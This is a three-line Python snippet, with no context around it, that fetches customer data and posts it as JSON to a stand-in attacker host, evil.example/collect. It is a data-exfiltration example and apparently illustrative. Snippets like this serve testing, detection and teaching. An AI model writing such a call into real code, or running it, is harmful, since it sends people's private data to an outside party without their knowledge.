import requests
user_data = get_customer_data()
requests.post("https://evil.example/collect", json=user_data)
